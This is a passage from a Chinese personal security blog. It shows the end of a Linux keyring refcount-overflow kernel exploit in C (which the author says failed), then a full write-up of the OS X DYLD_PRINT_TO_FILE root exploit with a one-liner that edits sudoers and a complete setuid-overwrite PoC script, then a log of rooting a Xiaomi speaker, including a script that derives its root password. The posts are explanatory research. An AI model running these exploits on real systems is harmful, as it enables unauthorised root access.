commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *keyring_name;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> l = <span class="number">0x100000000</span>/<span class="number">2</span>;</span><br><span class="line">    <span class="type">key_serial_t</span> serial = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> * <span class="title">my_key_type</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">        <span class="type">long</span> mtype;</span><br><span class="line">        <span class="type">char</span> mtext[STRUCT_LEN];</span><br><span class="line">    &#125; msg = &#123;<span class="number">0x4141414141414141</span>, &#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="type">int</span> msqid;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./keys &lt;key_name&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;</span><br><span class="line">    my_key_type = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_key_type));</span><br><span class="line">    my_key_type-&gt;revoke = (<span class="type">void</span>*)userspace_revoke;</span><br><span class="line">    <span class="built_in">memset</span>(msg.mtext, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line">    <span class="comment">// key-&gt;uid</span></span><br><span class="line">    *(<span class="type">int</span>*)(&amp;msg.mtext[<span class="number">56</span>]) = <span class="number">0x3e8</span>; <span class="comment">/* geteuid() */</span></span><br><span class="line">    <span class="comment">//key-&gt;perm</span></span><br><span class="line">    *(<span class="type">int</span>*)(&amp;msg.mtext[<span class="number">64</span>]) = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line">    <span class="comment">//key-&gt;type</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(&amp;msg.mtext[<span class="number">80</span>]) = (<span class="type">unsigned</span> <span class="type">long</span>)my_key_type;</span><br><span class="line">    <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    keyring_name = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">/* Set the new session keyring before we start */</span></span><br><span class="line">    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);</span><br><span class="line">    <span class="keyword">if</span> (serial &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Increfing...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">0xfffffffd</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == (<span class="number">0xffffffff</span> - l)) &#123;</span><br><span class="line">            l = l/<span class="number">2</span>;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*此处为个人添加，可动态显示内核对象的引用进度*/</span></span><br><span class="line">		<span class="keyword">if</span> (i&lt;<span class="number">0xffffff00</span> &amp;&amp; i % <span class="number">429496</span>==<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="type">double</span> tmp=i*<span class="number">1.0</span>/<span class="number">42949670</span>;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\r\x1b[KProgress: %3.1lf%%\r&quot;</span>,tmp);</span><br><span class="line">			fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/***************************************/</span></span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* here we are going to leak the last references to overflow */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished increfing&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;forking...&quot;</span>);</span><br><span class="line">    <span class="comment">/* allocate msg struct in the kernel rewriting the freed keyring object */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                    perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished forking&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* call userspace_revoke from kernel */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;caling revoke...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl_revoke&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译，运行</p>
<img src="/2016/01/27/2016-01-27/23.05.54.png" class="">
<p>此时查看&#x2F;proc&#x2F;keys的内容可以看到keyring的引用计数在变化(ubuntu14下是无规则变动O_O，其他系统正常)</p>
<img src="/2016/01/27/2016-01-27/23.06.39.png" class="">
<p>经过漫长的等待，得到如下结果：</p>
<img src="/2016/01/27/2016-01-27/23.38.15.png" class="">
<p>并没有得到root。。。</p>
<p>分别在ubuntu14、centos6.5、centos7.0、kali等平台的虚拟机里尝试，都没有成功提权。。。猜测是因为虚拟机内存的释放和分配受其他因素影响比较厉害，一直无法使目标函数指针分配到正确的位置。一怒之下把函数地址分别改成0x0和0x1，出现 Ubuntu发生严重错误需要重启 的对话框，看起来是有被调用的样子。。<br>另，根据google的一份对应arm上安卓的代码(用syscall代替了一些api)编译了安卓上的poc，尝试在CM12下的一加手机上运行：</p>
<img src="/2016/01/27/2016-01-27/1.pic.jpg" class="">
<p>算了下，按这速度估计得跑个个把月。<br>(另，第二天解锁手机发现进度在0.018%，估计有生之年跑不完了 T_T )。</p>
<p>由于实践失败并没有出真知，因此度过了一个不愉快的周末。。。</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>vulns</tag>
      </tags>
  </entry>
  <entry>
    <title>博客迁移小记</title>
    <url>/2017/08/29/2017-08-29/</url>
    <content><![CDATA[<p>　　翻看历史邮件想起来前段时间farbox向bitcron进化了，于是抽时间把博客从旧平台迁移过来，还加了个https。由于之前用的“多说”评论系统失效，尝试了下disqus，不科学上网连评论框都看不到。。。　　换用“来必乐”试了试，样式倒是不错，可惜加载太慢，也不支持旧评论导入，索性就改回bitcron原生评论系统吧。原生评论系统功能比较单一，好在格式比较简单，手动把以前多说的json改成csv同步了一下，基本恢复迁移前的样子。</p>
<p>　　说起来也有一年多没写点东西了，bitcron，还是要cron的，过几天记录一下能回想起来的事情吧。</p>
]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac OSX yosemite本地提权漏洞</title>
    <url>/2015/08/07/2015-08-07/</url>
    <content><![CDATA[<p>昨晚在<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzc0MTgwLmh0bWw=" title="http://www.freebuf.com/news/74180.html">freebuf<i class="fa fa-external-link"></i></span>上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的<strong>DYLD_PRINT_TO_FILE</strong>环境变量来实现本地提权免密码root安装。<br>脚本思路大致如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;echo \&quot;<span class="subst">$(whoami)</span> ALL=(ALL) NOPASSWD:ALL\&quot; &gt;&amp;3 &quot;</span>|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;<span class="built_in">sudo</span> -s dosomethingroot</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuYXBwbGUuY29tL2xpYnJhcnkvcHJlcmVsZWFzZS9tYWMvZG9jdW1lbnRhdGlvbi9EYXJ3aW4vUmVmZXJlbmNlL01hblBhZ2VzL21hbjEvZHlsZC4xLmh0bWw=" title="https://developer.apple.com/library/prerelease/mac/documentation/Darwin/Reference/ManPages/man1/dyld.1.html">DYLD<i class="fa fa-external-link"></i></span>全称dynamic link editor，听名字是实现类似动态链接库加载的东西，<strong>DYLD_PRINT_TO_FILE</strong>是苹果在OSX 10.10加入的一个新特性，主要功能是实现将dyld进程的错误日志重定向到此环境变量指定的可写文件。不过添加这个特性的时候貌似没把它加在有安全验证的代码范围内而是直接写在dyld的main里了。。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//大致添加的代码</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* loggingPath = _simple_getenv(envp, <span class="string">&quot;DYLD_PRINT_TO_FILE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( loggingPath != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        <span class="type">int</span> fd = open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, <span class="number">0644</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd != <span class="number">-1</span> ) &#123;</span><br><span class="line">                sLogfile = fd;</span><br><span class="line">                sLogToFile = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                dyld::<span class="built_in">log</span>(<span class="string">&quot;dyld: could not open DYLD_PRINT_TO_FILE=&#x27;%s&#x27;, errno=%d\n&quot;</span>, loggingPath, errno);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从代码中来看dyld是直接从环境变量中获取<strong>DYLD_PRINT_TO_FILE</strong>的值作为文件路径并append写打开文件，那么问题就来了。。。<br>普通用户可以利用这个变量在系统目录创建文件，或如前面的恶意软件那样修改root的配置文件，或修改SUID的bin文件。<br>更严重的是这个文件的描述符并没有被关闭，特权父进程fork出的子进程都可以对文件进行操作。<br>了解了原理再看恶意软件的代码，脚本首先设置环境变量DYLD_PRINT_TO_FILE，再启动newgrp这个SUID文件来执行echo “string” &gt; &amp;3的操作，此时3通过<strong>DYLD_PRINT_TO_FILE</strong>分配给了sudoers文件，所以结果就是在sudoers的尾部添加了一行针对当前账户的配置，脚本再去执行sudo -s command就没有提示了。<br>google了一番看了些歪果仁写的帖子，以下为两个关于此漏洞的poc脚本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$  EDITOR=/usr/bin/true DYLD_PRINT_TO_FILE=/this_system_is_vulnerable crontab -e</span><br></pre></td></tr></table></figure>
<p>这个poc用的是suid的crontab作loader</p>
<p>下面是一个精彩的poc</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Simple Proof of Concept Exploit for the DYLD_PRINT_TO_FILE</span></span><br><span class="line"><span class="comment"># local privilege escalation vulnerability in OS X 10.10 - 10.10.4</span></span><br><span class="line"><span class="comment"># (C) Copyright 2015 Stefan Esser &lt;stefan.esser@sektioneins.de&gt;</span></span><br><span class="line"><span class="comment"># Wait months for a fix from Apple or install the following KEXT as protection</span></span><br><span class="line"><span class="comment"># https://github.com/sektioneins/SUIDGuard</span></span><br><span class="line"><span class="comment"># Use at your own risk. This copies files around with root permissions,</span></span><br><span class="line"><span class="comment"># overwrites them and deletes them afterwards. Any glitch could corrupt your</span></span><br><span class="line"><span class="comment"># system. So you have been warned.</span></span><br><span class="line">SUIDVICTIM=/usr/bin/newgrp</span><br><span class="line"><span class="comment"># why even try to prevent a race condition?</span></span><br><span class="line">TARGET=`<span class="built_in">pwd</span>`/tmpXXXXX</span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$TARGET</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="variable">$TARGET</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; $TARGET/boomsh.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">        setuid(0);</span></span><br><span class="line"><span class="string">        setgid(0);</span></span><br><span class="line"><span class="string">        system(&quot;/bin/bash -i&quot;);</span></span><br><span class="line"><span class="string">        printf(&quot;done.\n&quot;);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; $TARGET/overwrite.c</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(int argc, char **argv)&#123;</span></span><br><span class="line"><span class="string">        int fd;</span></span><br><span class="line"><span class="string">        char buffer[1024];</span></span><br><span class="line"><span class="string">        ssize_t toread, numread;</span></span><br><span class="line"><span class="string">        ssize_t numwritten;</span></span><br><span class="line"><span class="string">        ssize_t size;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* disable O_APPEND */</span></span><br><span class="line"><span class="string">        fcntl(3, F_SETFL, 0);</span></span><br><span class="line"><span class="string">        lseek(3, 0, SEEK_SET);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* write file into it */</span></span><br><span class="line"><span class="string">        fd = open(</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\&quot;<span class="variable">$TARGET</span>/boomsh\&quot;&quot;</span> &gt;&gt; <span class="variable">$TARGET</span>/overwrite.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt;&gt; $TARGET/overwrite.c</span></span><br><span class="line"><span class="string">        , O_RDONLY, 0);</span></span><br><span class="line"><span class="string">        if (fd &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                /* determine size */</span></span><br><span class="line"><span class="string">                size = lseek(fd, 0, SEEK_END);</span></span><br><span class="line"><span class="string">                lseek(fd, 0, SEEK_SET);</span></span><br><span class="line"><span class="string">                while (size &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                        if (size &gt; sizeof(buffer)) &#123;</span></span><br><span class="line"><span class="string">                                toread = sizeof(buffer);</span></span><br><span class="line"><span class="string">                        &#125; else &#123;</span></span><br><span class="line"><span class="string">                                toread = size;</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        numread = read(fd, &amp;buffer, toread);</span></span><br><span class="line"><span class="string">                        if (numread &lt; toread) &#123;</span></span><br><span class="line"><span class="string">                                fprintf(stderr, &quot;problem reading\n&quot;);</span></span><br><span class="line"><span class="string">                                _exit(2);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        numwritten = write(3, &amp;buffer, numread);</span></span><br><span class="line"><span class="string">                        if (numread != numwritten) &#123;</span></span><br><span class="line"><span class="string">                                fprintf(stderr, &quot;problem writing\n&quot;);</span></span><br><span class="line"><span class="string">                                _exit(2);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        size -= numwritten;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                fsync(3);</span></span><br><span class="line"><span class="string">                close(fd);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">                fprintf(stderr, &quot;Cannot open for reading\n&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">cp</span> <span class="variable">$SUIDVICTIM</span> <span class="variable">$TARGET</span>/backup</span><br><span class="line">gcc -o <span class="variable">$TARGET</span>/overwrite <span class="variable">$TARGET</span>/overwrite.c</span><br><span class="line">gcc -o <span class="variable">$TARGET</span>/boomsh <span class="variable">$TARGET</span>/boomsh.c</span><br><span class="line">EDITOR=<span class="variable">$TARGET</span>/overwrite DYLD_PRINT_TO_FILE=<span class="variable">$SUIDVICTIM</span> crontab -e 2&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp <span class="variable">$TARGET</span>/boomsh /usr/bin/boomsh; chmod 04755 /usr/bin/boomsh &quot;</span> | <span class="variable">$SUIDVICTIM</span> &gt; /dev/null 2&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp <span class="variable">$TARGET</span>/backup <span class="variable">$SUIDVICTIM</span>&quot;</span> | /usr/bin/boomsh &gt; /dev/null 2&gt; /dev/null</span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$TARGET</span></span><br><span class="line">/usr/bin/boomsh</span><br></pre></td></tr></table></figure>

<p>这风骚的bash姿势也是让人大开眼界，歪果仁真会玩。<br>脚本生成了两个c，第一个比较简单，先设置用户和组到root，再调用bash；第二个把第一个生成的二进制读出来再写到文件流3(DYLD_PRINT_TO_FILE)里。<br>之后脚本把newgrp(host suid)拷到临时文件，编译两个c，通过crontab(loader suid)获得高权限的3文件描述符(写到host suid)，crontab调用EDITOR把boomsh写到3(不要求特权)，然后调用被修改了的newgrp(host suid)安装boomsh并设置boomsh的suid，再调用安装好的boomsh还原newgrp，删除临时文件，执行boomsh。</p>
<p>这里需要提一点，虽然write的manual中说非特权账户write带suid的bin时会去除bin的suid，但得益于DYLD_PRINT_TO_FILE，loader suid进程以root打开了带suid的host bin，文件描述符继承了root级别的特权，所以对描述符的操作会被认为是root级的，所以没有触发manual中说的对write的限制，具体的细节应该类似于win下文件的context之类的吧。</p>
<p>开发人员的安全意识有待提高啊。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VrdGlvbmVpbnMuZGUvZW4vYmxvZy8xNS0wNy0wNy1keWxkX3ByaW50X3RvX2ZpbGVfbHBlLmh0bWw=" title="https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html">参考链接<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>小米AI音箱(小爱同学)root记录</title>
    <url>/2020/12/01/2020-12-01/</url>
    <content><![CDATA[<p>最近计划搞一搞智能音箱，从网上买了一个二手的小米AI音箱（型号MDZ-25-DA）</p>
<img src="/2020/12/01/2020-12-01/xiaomi-ai.jpg" class="">

<p>拆开看是绿板主板，应该是偏新的批次，主板外观如下图：</p>
<img src="/2020/12/01/2020-12-01/green-board.jpg" class="">

<p>参考<span class="exturl" data-url="aHR0cHM6Ly9iYnMuaGFzc2JpYW4uY29tL2ZvcnVtLnBocD9tb2Q9dmlld3RocmVhZCZ0aWQ9ODc1NCZwYWdlPTE=" title="https://bbs.hassbian.com/forum.php?mod=viewthread&tid=8754&page=1">hassbian<i class="fa fa-external-link"></i></span>的方法对设备进行root，记录一下。</p>
<h3 id="1-拆机串口登录"><a href="#1-拆机串口登录" class="headerlink" title="1. 拆机串口登录"></a>1. 拆机串口登录</h3><p>从网上找了几个拆解图，基本知道螺丝位置后，正常进行拆解就行。调试串口为间距 1mm 的 3pin 口，淘宝买了根 SH 1.0mm 3pin 线，再焊接3根杜邦线接到 USB2TTL 设备上，波特率 115200 进入 tty，输入任意键，弹出 root 登录提示。</p>
<p>这个 root 密码和 kindle 的 root 密码挺像的，根据串号加固定字符串算出来的，有点HMAC的意思。</p>
<p>网上查找了一些资料，找到几个字符串，经过测试我的设备对应字符串是<code>B0168A6D-119A-F21A-DA58-980732F80A19</code>。</p>
<p>大致算法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通用说明：</span></span><br><span class="line"><span class="comment"># 1、先找到小爱音响SN码，通常在拆开后的底座里面。</span></span><br><span class="line"><span class="comment"># 例如：SN：20190/122119360</span></span><br><span class="line"><span class="comment"># 2、root登录密码=md5(SN+通配字符串)取值的前14位</span></span><br><span class="line"><span class="comment"># 通配字符串：9C78089F-83C7-3CDC-BCC9-93B378868E7F</span></span><br><span class="line"><span class="comment"># 即：20190/1221193609C78089F-83C7-3CDC-BCC9-93B378868E7F</span></span><br><span class="line"><span class="comment"># 3、使用MD5在线加密工具 https://md5jiami.51240.com/</span></span><br><span class="line"><span class="comment"># 4、将2中的最终待加密代码经md5加密后得到如下32位小写加密信息：（只看32位，且一定小写）</span></span><br><span class="line"><span class="comment"># 865027665beacb8f8240355d7300e0ac</span></span><br><span class="line"><span class="comment"># 取前14位：865027665beacb 即为root登陆密码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">MAGIC_SALTS = [\</span><br><span class="line">               <span class="string">&quot;5775B10D-15C0-7827-97B9-88EA07FCA97A&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;0168A6D-119A-F21A-DA58-980732F80A19&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;A20EDC68-62E5-70C6-76E8-75879721B8EC&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;B0168A6D-119A-F21A-DA58-980732F80A19&quot;</span>,\</span><br><span class="line">              ]</span><br><span class="line">sn = <span class="string">&quot;1****/9********&quot;</span></span><br><span class="line">root_password = md5( sn + MAGIC_SALTS[<span class="number">3</span>] ).lower()[:<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span> root_password</span><br></pre></td></tr></table></figure>

<h3 id="2-临时打开ssh"><a href="#2-临时打开ssh" class="headerlink" title="2. 临时打开ssh"></a>2. 临时打开ssh</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12A:~# dropbearkey -t rsa -f /data/dropbear_rsa_host_key</span><br><span class="line">root@S12A:~# dropbear -r /data/dropbear_rsa_host_key</span><br><span class="line">root@S12A:~# ifconfig</span><br></pre></td></tr></table></figure>

<p>然后通过 ssh 连入设备，界面上会比USB2TTL的CUI更完善一些。</p>
<h3 id="3-提取文件系统"><a href="#3-提取文件系统" class="headerlink" title="3. 提取文件系统"></a>3. 提取文件系统</h3><p><code>mount</code>看一下目前挂载的分区，另外可以<code>ls -alF /dev/mtd*</code>看看还有哪些其他分区，绿板小爱同学有a&#x2F;b分区备份，建议先刷1个分区，如果能够正常启动的话，再把另一个分区刷了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12A:~# mount</span><br><span class="line">/dev/mtdblock4 on / type squashfs (ro,noatime)</span><br><span class="line">proc on /proc type proc (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noatime)</span><br><span class="line">tmpfs on /dev type tmpfs (rw,nosuid,relatime,size=512k,mode=755)</span><br><span class="line">devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,mode=600,ptmxmode=000)</span><br><span class="line">debugfs on /sys/kernel/debug type debugfs (rw,noatime)</span><br><span class="line">pstore on /sys/fs/pstore type pstore (rw,relatime)</span><br><span class="line">/dev/ubi0_0 on /data type ubifs (rw,relatime)</span><br><span class="line">/dev/ubi0_0 on /etc/shadow type ubifs (rw,relatime)</span><br><span class="line">root@S12A:~# ll /dev/mtd*</span><br><span class="line">crw-------    1 root     root       90,   0 Jan  1  2015 /dev/mtd0</span><br><span class="line">crw-------    1 root     root       90,   1 Jan  1  2015 /dev/mtd0ro</span><br><span class="line">crw-------    1 root     root       90,   2 Jan  1  2015 /dev/mtd1</span><br><span class="line">crw-------    1 root     root       90,   3 Jan  1  2015 /dev/mtd1ro</span><br><span class="line">crw-------    1 root     root       90,   4 Jan  1  2015 /dev/mtd2</span><br><span class="line">crw-------    1 root     root       90,   5 Jan  1  2015 /dev/mtd2ro</span><br><span class="line">crw-------    1 root     root       90,   6 Jan  1  2015 /dev/mtd3</span><br><span class="line">crw-------    1 root     root       90,   7 Jan  1  2015 /dev/mtd3ro</span><br><span class="line">crw-------    1 root     root       90,   8 Jan  1  2015 /dev/mtd4</span><br><span class="line">crw-------    1 root     root       90,   9 Jan  1  2015 /dev/mtd4ro</span><br><span class="line">crw-------    1 root     root       90,  10 Jan  1  2015 /dev/mtd5</span><br><span class="line">crw-------    1 root     root       90,  11 Jan  1  2015 /dev/mtd5ro</span><br><span class="line">crw-------    1 root     root       90,  12 Jan  1  2015 /dev/mtd6</span><br><span class="line">crw-------    1 root     root       90,  13 Jan  1  2015 /dev/mtd6ro</span><br><span class="line">brw-------    1 root     root       31,   0 Jan  1  2015 /dev/mtdblock0</span><br><span class="line">brw-------    1 root     root       31,   1 Jan  1  2015 /dev/mtdblock1</span><br><span class="line">brw-------    1 root     root       31,   2 Jan  1  2015 /dev/mtdblock2</span><br><span class="line">brw-------    1 root     root       31,   3 Jan  1  2015 /dev/mtdblock3</span><br><span class="line">brw-------    1 root     root       31,   4 Jan  1  2015 /dev/mtdblock4</span><br><span class="line">brw-------    1 root     root       31,   5 Jan  1  2015 /dev/mtdblock5</span><br><span class="line">brw-------    1 root     root       31,   6 